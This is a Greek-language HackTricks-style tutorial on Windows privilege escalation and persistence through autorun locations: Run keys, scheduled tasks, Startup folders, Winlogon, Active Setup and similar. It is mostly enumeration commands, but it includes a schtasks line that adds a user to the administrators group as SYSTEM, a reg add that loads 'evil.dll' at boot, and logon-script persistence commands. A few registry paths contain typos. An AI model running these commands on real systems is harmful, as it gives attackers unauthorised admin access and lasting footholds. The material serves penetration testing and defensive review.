# Αύξηση Δικαιωμάτων με Autoruns

{{#include ../../banners/hacktricks-training.md}}



## WMIC

Το **Wmic** μπορεί να χρησιμοποιηθεί για να εκτελεί προγράμματα κατά την **εκκίνηση**. Δες ποια binaries είναι προγραμματισμένα να εκτελούνται κατά την εκκίνηση με:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Προγραμματισμένες Εργασίες

Οι **Tasks** μπορούν να προγραμματιστούν ώστε να εκτελούνται με **ορισμένη συχνότητα**. Δείτε ποια binaries είναι προγραμματισμένα να εκτελούνται με:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Φάκελοι

Όλα τα binaries που βρίσκονται στους **Startup folders θα εκτελούνται κατά την εκκίνηση**. Οι συνηθισμένοι startup folders είναι αυτοί που παρατίθενται στη συνέχεια, αλλά ο startup folder υποδεικνύεται στο registry. [Διαβάστε αυτό για να μάθετε πού.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
> **FYI**: Archive extraction *path traversal* vulnerabilities (such as the one abused in WinRAR prior to 7.13 – CVE-2025-8088) can be leveraged to **deposit payloads directly inside these Startup folders during decompression**, resulting in code execution on the next user logon.  For a deep-dive into this technique see:


{{#ref}}
../../generic-hacking/archive-extraction-path-traversal.md
{{#endref}}



## Registry

> [!TIP]
> [Note from here](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): The **Wow6432Node** registry entry indicates that you are running a 64-bit Windows version. The operating system uses this key to display a separate view of HKEY_LOCAL_MACHINE\SOFTWARE for 32-bit applications that run on 64-bit Windows versions.

### Runs

**Commonly known** AutoRun registry:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Τα registry keys που είναι γνωστά ως **Run** και **RunOnce** έχουν σχεδιαστεί για να εκτελούν αυτόματα προγράμματα κάθε φορά που ένας χρήστης συνδέεται στο σύστημα. Η γραμμή εντολών που αντιστοιχίζεται ως τιμή δεδομένων ενός key περιορίζεται σε 260 χαρακτήρες ή λιγότερους.

**Service runs** (can control automatic startup of services during boot):

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Στα Windows Vista και νεότερες εκδόσεις, τα registry keys **Run** και **RunOnce** δεν δημιουργούνται αυτόματα. Οι καταχωρήσεις σε αυτά τα keys μπορούν είτε να εκκινούν απευθείας προγράμματα είτε να τα ορίζουν ως εξαρτήσεις. Για παράδειγμα, για να φορτωθεί ένα DLL file κατά το logon, θα μπορούσε να χρησιμοποιηθεί το registry key **RunOnceEx** μαζί με ένα "Depend" key. Αυτό αποδεικνύεται με την προσθήκη μιας registry entry για εκτέλεση του "C:\temp\evil.dll" κατά την εκκίνηση του συστήματος:
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
> [!TIP]
> **Exploit 1**: Αν μπορείς να γράψεις μέσα σε οποιοδήποτε από τα αναφερόμενα registry μέσα στο **HKLM** μπορείς να κάνεις privilege escalation όταν συνδεθεί ένας διαφορετικός χρήστης.

> [!TIP]
> **Exploit 2**: Αν μπορείς να αντικαταστήσεις οποιοδήποτε από τα binaries που υποδεικνύονται σε οποιοδήποτε από τα registry μέσα στο **HKLM** μπορείς να τροποποιήσεις εκείνο το binary με ένα backdoor όταν συνδεθεί ένας διαφορετικός χρήστης και να κάνεις privilege escalation.
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Startup Path

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Τα shortcuts που τοποθετούνται στον φάκελο **Startup** θα ενεργοποιούν αυτόματα services ή applications για εκκίνηση κατά το user logon ή το system reboot. Η τοποθεσία του φακέλου **Startup** ορίζεται στο registry τόσο για τα scopes **Local Machine** όσο και **Current User**. Αυτό σημαίνει ότι οποιοδήποτε shortcut προστεθεί σε αυτές τις καθορισμένες θέσεις **Startup** θα διασφαλίζει ότι το συνδεδεμένο service ή πρόγραμμα ξεκινά μετά τη διαδικασία logon ή reboot, καθιστώντας το μια απλή μέθοδο για τον προγραμματισμό programs ώστε να εκτελούνται αυτόματα.

> [!TIP]
> Αν μπορείς να κάνεις overwrite οποιοδήποτε \[User] Shell Folder υπό **HKLM**, θα μπορείς να το δείξεις σε έναν φάκελο που ελέγχεις εσύ και να τοποθετήσεις ένα backdoor που θα εκτελείται κάθε φορά που ένας user κάνει log in στο system, escalating privileges.
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### UserInitMprLogonScript

- `HKCU\Environment\UserInitMprLogonScript`

Αυτή η τιμή του registry ανά χρήστη μπορεί να δείχνει σε ένα script ή command που εκτελείται όταν αυτός ο χρήστης κάνει logon. Είναι κυρίως ένα primitive **persistence** επειδή εκτελείται μόνο στο context του επηρεασμένου χρήστη, αλλά αξίζει να ελέγχεται κατά το post-exploitation και σε autoruns reviews.

> [!TIP]
> Αν μπορείς να γράψεις αυτή την τιμή για τον τρέχοντα χρήστη, μπορείς να ξαναενεργοποιήσεις την εκτέλεση στο επόμενο interactive logon χωρίς να χρειάζεσαι admin rights. Αν μπορείς να τη γράψεις για το hive άλλου χρήστη, μπορεί να αποκτήσεις code execution όταν αυτός ο χρήστης κάνει logon.
```bash
reg query "HKCU\Environment" /v "UserInitMprLogonScript"
reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "C:\Users\Public\logon.bat" /f
reg delete "HKCU\Environment" /v "UserInitMprLogonScript" /f

Get-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
Set-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript" -Value 'C:\Users\Public\logon.bat'
Remove-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
```
Σημειώσεις:

- Προτίμησε πλήρη paths προς `.bat`, `.cmd`, `.ps1`, ή άλλα launcher files που είναι ήδη αναγνώσιμα από τον target user.
- Αυτό επιβιώνει από logoff/reboot μέχρι να αφαιρεθεί η τιμή.
- Σε αντίθεση με το `HKLM\...\Run`, αυτό δεν δίνει από μόνο του elevation· είναι persistence σε user-scope.

### Winlogon Keys

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Συνήθως, το **Userinit** key είναι ρυθμισμένο σε **userinit.exe**. Ωστόσο, αν αυτό το key τροποποιηθεί, το καθορισμένο executable θα εκκινηθεί επίσης από το **Winlogon** κατά το user logon. Ομοίως, το **Shell** key προορίζεται να δείχνει στο **explorer.exe**, που είναι το default shell για τα Windows.
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
> [!TIP]
> Αν μπορείτε να αντικαταστήσετε την τιμή του registry ή το binary, θα μπορείτε να κάνετε privilege escalation.

### Policy Settings

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Ελέγξτε το **Run** key.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Αλλαγή του Safe Mode Command Prompt

Στο Windows Registry, κάτω από `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`, υπάρχει μια τιμή **`AlternateShell`** που έχει οριστεί από προεπιλογή σε `cmd.exe`. Αυτό σημαίνει ότι όταν επιλέγεις "Safe Mode with Command Prompt" κατά την εκκίνηση (πατώντας F8), χρησιμοποιείται το `cmd.exe`. Όμως, είναι δυνατό να ρυθμίσεις τον υπολογιστή σου ώστε να ξεκινά αυτόματα σε αυτήν τη λειτουργία χωρίς να χρειάζεται να πατήσεις F8 και να την επιλέξεις χειροκίνητα.

Βήματα για να δημιουργήσεις ένα boot option για αυτόματη εκκίνηση σε "Safe Mode with Command Prompt":

1. Άλλαξε τα attributes του αρχείου `boot.ini` για να αφαιρέσεις τα read-only, system και hidden flags: `attrib c:\boot.ini -r -s -h`
2. Άνοιξε το `boot.ini` για επεξεργασία.
3. Πρόσθεσε μια γραμμή όπως: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Αποθήκευσε τις αλλαγές στο `boot.ini`.
5. Εφάρμοσε ξανά τα αρχικά file attributes: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** Η αλλαγή του κλειδιού μητρώου **AlternateShell** επιτρέπει προσαρμοσμένη ρύθμιση command shell, με πιθανή χρήση για μη εξουσιοδοτημένη πρόσβαση.
- **Exploit 2 (PATH Write Permissions):** Το να έχεις write permissions σε οποιοδήποτε μέρος της μεταβλητής **PATH** του συστήματος, ειδικά πριν από το `C:\Windows\system32`, σου επιτρέπει να εκτελέσεις ένα προσαρμοσμένο `cmd.exe`, το οποίο μπορεί να λειτουργήσει ως backdoor αν το σύστημα ξεκινήσει σε Safe Mode.
- **Exploit 3 (PATH and boot.ini Write Permissions):** Η δυνατότητα εγγραφής στο `boot.ini` επιτρέπει την αυτόματη εκκίνηση σε Safe Mode, διευκολύνοντας τη μη εξουσιοδοτημένη πρόσβαση στην επόμενη επανεκκίνηση.

Για να ελέγξεις την τρέχουσα ρύθμιση **AlternateShell**, χρησιμοποίησε αυτές τις εντολές:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Installed Component

Το Active Setup είναι μια δυνατότητα στα Windows που **ξεκινά πριν φορτωθεί πλήρως το περιβάλλον desktop**. Δίνει προτεραιότητα στην εκτέλεση ορισμένων commands, τα οποία πρέπει να ολοκληρωθούν πριν συνεχιστεί το user logon. Αυτή η διαδικασία συμβαίνει ακόμα και πριν ενεργοποιηθούν άλλα startup entries, όπως αυτά στις registry sections Run ή RunOnce.

Το Active Setup διαχειρίζεται μέσω των ακόλουθων registry keys:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

Μέσα σε αυτά τα keys υπάρχουν διάφορα subkeys, το καθένα από τα οποία αντιστοιχεί σε ένα συγκεκριμένο component. Τα key values ιδιαίτερου ενδιαφέροντος περιλαμβάνουν:

- **IsInstalled:**
- `0` υποδεικνύει ότι το command του component δεν θα εκτελεστεί.
- `1` σημαίνει ότι το command θα εκτελεστεί μία φορά για κάθε user, που είναι και η default συμπεριφορά αν το `IsInstalled` value λείπει.
- **StubPath:** Καθορίζει το command που θα εκτελεστεί από το Active Setup. Μπορεί να είναι οποιοδήποτε valid command line, όπως η εκκίνηση του `notepad`.

**Security Insights:**

- Η τροποποίηση ή η εγγραφή σε ένα key όπου το **`IsInstalled`** έχει οριστεί σε `"1"` με ένα συγκεκριμένο **`StubPath`** μπορεί να οδηγήσει σε unauthorized command execution, ενδεχομένως για privilege escalation.
- Η αλλοίωση του binary file που αναφέρεται σε οποιαδήποτε τιμή **`StubPath`** θα μπορούσε επίσης να επιτύχει privilege escalation, εφόσον υπάρχουν επαρκή permissions.

Για να επιθεωρήσετε τις ρυθμίσεις **`StubPath`** σε όλα τα Active Setup components, μπορούν να χρησιμοποιηθούν αυτά τα commands:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Browser Helper Objects

### Επισκόπηση των Browser Helper Objects (BHOs)

Τα Browser Helper Objects (BHOs) είναι DLL modules που προσθέτουν επιπλέον features στο Microsoft Internet Explorer. Φορτώνονται στο Internet Explorer και στο Windows Explorer με κάθε εκκίνηση. Ωστόσο, η εκτέλεσή τους μπορεί να μπλοκαριστεί ορίζοντας το **NoExplorer** key σε 1, εμποδίζοντάς τα να φορτωθούν με instances του Windows Explorer.

Τα BHOs είναι συμβατά με το Windows 10 μέσω του Internet Explorer 11, αλλά δεν υποστηρίζονται στο Microsoft Edge, το default browser στις νεότερες εκδόσεις του Windows.

Για να εξερευνήσεις τα BHOs που είναι registered σε ένα σύστημα, μπορείς να ελέγξεις τα ακόλουθα registry keys:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Κάθε BHO αναπαρίσταται από το **CLSID** του στο registry, λειτουργώντας ως μοναδικό identifier. Λεπτομερείς πληροφορίες για κάθε CLSID μπορούν να βρεθούν στο `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Για querying των BHOs στο registry, μπορούν να χρησιμοποιηθούν αυτές οι εντολές:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Internet Explorer Extensions

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Σημείωσε ότι το registry θα περιέχει 1 νέο registry ανά κάθε dll και θα αναπαρίσταται από το **CLSID**. Μπορείς να βρεις τις πληροφορίες του CLSID στο `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Font Drivers

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Άνοιγμα Command

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Επιλογές Εκτέλεσης Αρχείων Εικόνας
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Σημείωσε ότι όλα τα sites όπου μπορείς να βρεις autoruns είναι **ήδη searched by**[ **winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe). Ωστόσο, για μια **πιο comprehensive list of auto-executed** file μπορείς να χρησιμοποιήσεις [autoruns ](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)from systinternals:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## Περισσότερα

**Βρείτε περισσότερα Autoruns όπως registries στο** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)

## Αναφορές

- [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
- [https://attack.mitre.org/techniques/T1037/001/](https://attack.mitre.org/techniques/T1037/001/)
- [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)
- [https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026)



{{#include ../../banners/hacktricks-training.md}}
